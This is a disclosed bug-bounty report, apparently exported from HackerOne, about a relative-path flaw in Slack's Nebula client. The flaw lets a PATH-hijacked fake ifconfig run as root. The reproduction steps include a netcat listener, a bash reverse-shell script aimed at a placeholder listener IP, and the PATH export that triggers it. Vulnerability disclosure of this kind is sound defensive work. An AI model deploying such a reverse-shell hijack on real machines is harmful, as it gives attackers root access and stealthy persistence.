{"id":784714,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODQ3MTQ=","url":"https://hackerone.com/reports/784714","title":"Relative Path Vulnerability Results in Arbitrary Command Execution/Privilege Escalation","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-01-28T12:43:33.476Z","submitted_at":"2020-01-28T12:43:33.476Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jhancock","url":"/jhancock","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":69,"url":"https://hackerone.com/slack","handle":"slack","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/069/683fee312381bc46cadc7ea1950abc87944d12c3_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Slack","twitter_handle":"slackhq","website":"https://slack.com","about":"All your team communication in one place, instantly searchable, and available wherever you go."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-04-01T22:10:32.788Z","bug_reporter_agreed_on_going_public_at":"2020-03-02T22:10:24.076Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"### Overview###\nThe Nebula clients for Darwin and Windows call relative paths in \"exec.Command\" to \"ifconfig\" and \"route\" executables on Darwin, and to \"netsh\" on Windows. These commands are entered using relative paths, not absolute paths (such as /sbin/ifconfig). When a binary is run with a relative path, the system uses environmental variables (\"PATH\") to determine the search order of folders that should be searched for the command run. By modifying the environmental variable, an attacker can prioritize an arbitrary path containing a binary of the same name, and it will execute when Nebula runs. \n\nThe affected code can be found at https://github.com/slackhq/nebula/search?q=exec.Command\u0026unscoped_q=exec.Command); specifically:\n\nnebula/tun_darwin.go:45\nnebula/tun_darwin.go:48\nnebula/tun_darwin.go:51\nnebula/tun_darwin.go:56\nnebula/tun_windows:50\nnebula/tun_windows:60\n\n###Steps###\nTo reproduce this attack, open a terminal on a MacOS system running the Darwin Nebula client and a terminal on a Linux or MacOS system to catch the shell. Perform the following steps:\n1. On a host accessible to the MacOS system, run the following command to start a Netcat listener:\n`sudo nc -nvlp 443`\n\n2. On the MacOS system with the Nebula client, run the command \"whoami\" (or id) and \"hostname\"\n\n3. Nebula attempts to call the \"ifconfig\" command, including three variables. A script file containing a pass-through to ifconfig must be created, but should include a bash reverse shell connecting to the IP address of the system in step 1 (\"LISTENER_IP_ADDRESS\"). Create a file in the /tmp/ folder called \"ifconfig\". Enter the following code the file:\n```\n#!/bin/bash\nbash -i \u003e\u0026 /dev/tcp/LISTENER_IP_ADDRESS/443 0\u003e\u00261 \u0026\nDEVICE=$1\nCIDER=$2\nIP=$3\n/sbin/ifconfig $1 $2 $3\n\n4. Make the script executable by running `chmod +x /tmp/ifconfig`\n\n5. Run the Nebula client with the command `sudo ./nebula -config config.yml`. When the ifconfig command is called, it will execute the reverse shell command in the script and then continue connecting.\n\n6. On the host in step 1, a reverse Bash shell connects. Run the command \"whoami\" (or id) and \"hostname\" and verify the user is now root, and the hostname is the hostname of the MacOS computer in step 2.\n\nNote: To perform this attack on Windows, a custom binary would need to be compiled and named \"netsh\" but the principles are the same on each OS. \n\n###Resolution###\nModify the paths on the affected lines to absolute paths. For example, line 45 of nebula/tun_darwin.go reads:\n\n```if err = exec.Command(\"ifconfig\", c.Device, c.Cidr.String(), c.Cidr.IP.String()).Run(); err != nil {```\n\nModify this snippet to provide an absolute path, as shown below:\n\n```if err = exec.Command(\"/sbin/ifconfig\", c.Device, c.Cidr.String(), c.Cidr.IP.String()).Run(); err != nil```\n\n## Impact\n\nBecause Nebula must be run with root/sudo permissions, this can be an effective privilege escalation technique. A standard user can modify the environment and create files in /tmp, and when Nebula is run, the command will open a reverse shell as the root user (see screenshots). Additionally, this could be used to maintain stealthy persistence on an affected machine. Because Nebula must restart to pick up changes to the config.yaml (such as firewall rules), it is reasonable to believe an attacker with presence on the box could modify the PATH settings and script, and the process would be restarted at some point in the future.","bounty_amount":"750.0","formatted_bounty":"$750","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-04-01T22:10:24.187Z","allow_singular_disclosure_after":-48187018.02175122,"singular_disclosure_allowed":true,"vote_count":9,"voters":["bitsscrambler","trainr3kt","cryptographer","shimura","hex0x0f","ram15","jimithefox","gustavetxc01","santieich"],"severity":{"rating":"medium","score":6.8,"author_type":"Team","metrics":{"attack_vector":"physical","attack_complexity":"low","privileges_required":"high","user_interaction":"none","scope":"changed","confidentiality":"high","integrity":"high","availability":"none"}},"structured_scope":{"databaseId":40624,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/slackhq/nebula","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":6890561,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Adding screenshots","automated_response":false,"created_at":"2020-01-28T12:44:25.984Z","updated_at":"2020-01-28T12:44:25.984Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":698566,"filename":"Slack_BB_Nebula_script.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/5gjJk2wPjcR2frtCCmWCJXLd?response-content-disposition=attachment%3B%20filename%3D%22Slack_BB_Nebula_script.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_BB_Nebula_script.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152722Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=eb5d4b155f1182053ae073d4f4e173db16c4e42444eb80d380bdd409ca15fe0b"},{"id":698565,"filename":"Slack_BB_Nebula_client_darwin.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/kyHvCeqXwoEpCesBkqKYpmf3?response-content-disposition=attachment%3B%20filename%3D%22Slack_BB_Nebula_client_darwin.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_BB_Nebula_client_darwin.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152722Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c9a36979097a791aab9d952cbe0fa0d8f24ee03cbd227bfece6eb3e3b01eeb4d"},{"id":698564,"filename":"Slack_BB_Nebula_listening_server.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/auWdhq8c63vCSKz7EftXro5n?response-content-disposition=attachment%3B%20filename%3D%22Slack_BB_Nebula_listening_server.png%22%3B%20filename%2A%3DUTF-8%27%27Slack_BB_Nebula_listening_server.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152722Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c5656c7a3ff515b0eca96844a92b2136c1ddf90de7b3be2beef7c281ca0c8b56"}],"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6896378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Apologies for missing a step - after creating the script and making it executable, add /tmp to the path by running\n`export PATH=/tmp:$PATH`\n\nThen run nebula  ","automated_response":false,"created_at":"2020-01-29T02:36:24.929Z","updated_at":"2020-01-29T02:36:24.929Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6912045,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thank you for your report @jhancock,\n\nWe want to make sure we fully understand the attack scenario for this behavior. According to your report, an attacker with physical access to a victim's device, (or the ability to run commands), can use this behavior to run commands on a victim's device as a superuser. An attacker does this by adding an environment variable which causes Nebula to run an attacker's malicious ifconfig command due to a relative path used in Nebula. However, when the Sudo command is run on some operating systems a new root user environment is created mitigating an attacker's ability to add a relative path to the sudo environment. \n\nWhat OS did you use to test this behavior? Did your OS have any specific features that caused environmental variables to be retained in the super user's bash environment?\n\n\nThank you for thinking of Slack Security","automated_response":false,"created_at":"2020-01-30T05:50:38.671Z","updated_at":"2020-01-30T05:50:38.671Z","actor":{"username":"bugtriage-sophia","cleared":false,"url":"/bugtriage-sophia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6920248,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi Sophia, \n\nThanks for getting back to me. First, the attack does not require physical access - the system could be compromised through a remote login session, an exploit in another software package installed on the machine, compromised SSH keys, etc. The initial access vector doesnt matter much, but the attacker only needs remote access. \n\nNext, the superuser attack with sudo as you described is one possible attack path. While some operating systems do reset the environment or pull from environmental configs when sudo is used, a fully patched default Mac OS installation does not. This is evidenced by the screenshots provided. Sudo su would reset the environment on Mac OS, but that isnt the attack path in question. \n\nAdditionally, attack paths exist outside of privilege escalation. An attacker with a foothold on the machine could use this for a persistence mechanism, regaining access each time Nebula was run regardless. At the end of the day, an attacker can execute unexpected code when running Nebula - this should never happen; an application should only execute functions and code that it expects and intends to run. ","automated_response":false,"created_at":"2020-01-30T13:34:10.571Z","updated_at":"2020-01-30T13:34:10.571Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6936131,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your response @jhancock,\n\nWe are investigating the behavior you described and will get back to you when we have more information.\n\nThank you for thinking of Slack security.","automated_response":false,"created_at":"2020-01-31T20:04:30.950Z","updated_at":"2020-01-31T20:04:30.950Z","actor":{"username":"bugtriage-sophia","cleared":false,"url":"/bugtriage-sophia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6960469,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello,\n\nCan you please provide an update on verification? Are more screenshots or clarifications needed from me?","automated_response":false,"created_at":"2020-02-04T13:41:38.725Z","updated_at":"2020-02-04T13:41:38.725Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6988835,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi, \n\nCan you provide a status update please?  ","automated_response":false,"created_at":"2020-02-07T16:02:35.651Z","updated_at":"2020-02-07T16:02:35.651Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7010416,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We apologize for the delay @jhancock\n\nWe are still looking into this one, but should be able to get back to your soon.","automated_response":false,"created_at":"2020-02-10T19:32:59.075Z","updated_at":"2020-02-10T19:32:59.075Z","actor":{"username":"bugtriage-josh","cleared":false,"url":"/bugtriage-josh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7057854,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Thank you for your patience @jhancock \n\nAs a best practice, we understand that Nebula should not use relative paths in code and will look into addressing this behavior as a defense in depth measure.\n\nHowever,  we have been doing some internal testing and we are having difficulty exploiting this issue, as you have described, on our OSX devices. In our tests, we were unable to modify the `Path` variable of our super user (`sudo`) shell using the command `export PATH=/tmp:$PATH`. It seems that some OSX devices by default use a separate Path variable when a command is run as a superuser. This also appears to be the default behavior on Debian and Ubuntu.\n\nCan you provide us a video that demonstrates this behavior on a default OSX install, so we can better understand your testing process?\n\nIn addition, you state the affected code can be found specifically in `tun_darwin.go` and `tun_windows.go`. Have you discovered any other files that contain relative files paths which could be vulnerable to this behavior? (e.g. `tun_linux.go`)\n\n\nThank you for thinking of Slack Security.","automated_response":false,"created_at":"2020-02-15T00:45:44.027Z","updated_at":"2020-02-15T00:45:44.027Z","actor":{"username":"bugtriage-sophia","cleared":false,"url":"/bugtriage-sophia","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7067426,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Sophia, \n\nThanks for getting back to me. The behavior was only discovered in tun_darwin.go and tun_windows.go; tun_linux.go appears to use syscalls versus calling a program and other files do not appear to call programs externally either. \n\nThe behavior reported has been replicated on several machines in my lab. I spun up a fresh 'macincloud.com' instance to demonstrate the behavior on a new freshly installed machine. Ive attached the video. \n\nIf you're running \"sudo env\" you wont see your path; thats accurate. However, running sudo \u003cprogram\u003e (in this case, \"sudo ./nebula -config config.yml\") fires off the program based on the current user's environment, as demonstrated in the video. Please replicate the steps in the video to see the vulnerability in action and how it can lead to some seriously bad things. Note as well in the video that the user running the commands is called \"admin\" and the shell that is caught is root, the highest level of access on a Unix based machine - clear privilege escalation by relative path abuse.","automated_response":false,"created_at":"2020-02-17T05:40:24.861Z","updated_at":"2020-02-17T05:40:41.396Z","actor":{"username":"jhancock","cleared":false,"url":"/jhancock","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":718856,"filename":"nebula.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xTEc8h22S1BL3Y7EQqNwEgNC?response-content-disposition=attachment%3B%20filename%3D%22nebula.mov%22%3B%20filename%2A%3DUTF-8%27%27nebula.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152722Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f5514049ca07f7e3e67c9b2eec8299b762f774627bc307f9fad6959b8f5af7b9"},{"id":718855,"filename":"Screen_Shot_2020-02-17_at_12.28.06_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/RwyjAAvxFgK8LRVBPk1MKvqr?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-02-17_at_12.28.06_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-02-17_at_12.28.06_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSEHZZ6G7%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T152722Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCICgcJulSRaAJ%2FlV4SEWAQTyL4zo08LbSxF3YkMq%2FNlQPAiEAwYnoA1Ejs7bfAWoTffEddff%2B50LJlobfOVtd1RM%2FYnEqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDNRRuPIe4WOmezSvuirXA0I2fovKepc%2Br2vRekK4MdhNGmdM4Pc0OuzIHNmi1YNhdeljOfmMGUcQHlPqei9TxAGt4a%2Bwb9xKRrQFaS2o2gwxQkFXonxhS2p2%2FCJsWYUo5r66Rt8sQTiLMsAQcSzSjjF4bWzRQlm%2FsXkyqmfct1BfShpBMKnI%2BGx4M48yQfNnfgyRoZjVuWMHzcNqo6i%2B3imvvfu1gDhHkBQgvqL6AhnkVsXPRp6bS08enQ%2B4LeWijQjUmlhVfE3gDt1zfAq%2Fe%2FxOw17jAAuZH4zvbU5%2FFtGrJy%2BmroOTUxv%2FmxiaS8mF368AXRZQT%2FQ%2BK1TgapuP6OgN2v4j35edAg5veKR5WdWsY0QgOpQDSxzsTc2OCErw7fYWcmQYeYhOLVSghUfUtkDG76jJaJQMd36SmC4L2sb2NQ06wkAJfvd6Xh2dj7rFd%2BeVtQEdiI0FpNpkr5AYIz9emwENChfGQLyYkIfW5YUmUZn7%2BrBuWRxITz%2B3soyUxqmlqH%2B32ar8fmBp4Ie0VZd5xxkyHz5L%2BO4aTQveejpP0KxMm2%2Flqz8faN%2FLDBmpyKrFPcJn0sktEBiYdZCKd%2FJMvehZSGrjjy%2F75WSa1FwB%2FTzTTFRrGtLtYGGYby7RdTaug%2BPMKTC2jZGLBjqlAW%2FqLgyIU3l7q2BIHZ9aOYbvAcm7k5gKph8EjMf6tXptYEaiHmQx1q5jFWsRXPiWMZbi4fKKkFbfrJI1NS%2FDW3ba%2FI9tKqyLv9ZB%2FyHxyGg3CQqjMAh5HPdI6A9scOywAto0wTVOHwkl9Ay%2BNQ%2BadpR1vVj4UXnFx6R7Mt2xHMMc188gMtdSb8CXyaP6RpR3xaP3OWl7wd9lKp0P5L%2BRwYyHexzCFA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a7a7b370d94178f0c2decc0b0fefc32873bd91859a33de2e67aeeed3fab8578c"}],"genius_execution_id":null,"team_handle":"slack","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7092735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your follow-up @jhancock,\n\nWe are investigating the behavior you described, and we will get back to you when we have more information.\n\nThank you for thinking of Slack 